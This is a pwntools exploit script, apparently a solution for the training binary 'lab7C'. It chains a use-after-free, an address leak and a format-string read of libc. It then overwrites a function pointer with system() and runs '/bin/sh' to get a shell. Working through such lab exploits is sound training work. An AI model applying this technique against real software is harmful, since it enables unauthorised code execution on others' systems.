from pwn import *

O_PRINTF = 0x880
LIBC_SYSTEM = 0x25430

p = process("./lab7C")

def make_string(what):

    p.sendlineafter("Enter Choice: ", "1")
    p.sendline(what)

def print_string(index, final=False):

    p.sendlineafter("Enter Choice: ", "5")
    p.sendlineafter("String index to print: ", str(index))
    if final:
        return
    s = p.recvline()
    
    return s

def print_number(index):

    p.sendlineafter("Enter Choice: ", "6")
    p.sendlineafter("Number index to print: ", str(index))
    num = p.recvline().split(":")[1][1:]
    
    return num

def free_string():
    p.sendlineafter("Enter Choice: ", "3")

def free_number():
    p.sendlineafter("Enter Choice: ", "4")

def make_number(number):
    p.sendlineafter("Enter Choice: ", "2")
    p.sendline(str(number))

make_number(5)
free_number()
make_string("")

base = int(print_number(1)) - 0xbc7
printf = base + O_PRINTF

log.success("Base: " + hex(base))
log.success("Printf: " + hex(printf))

free_string()
make_string("%2$p")
free_string()
make_number(printf)
base_libc = int(print_string(1)[2:-1],16) - 0x1bf580
log.success("Libc at: " + hex(base_libc))

free_number()
make_string("/bin/sh\x00")
free_string()
make_number(base_libc + LIBC_SYSTEM)
print_string(1, True)
p.interactive()

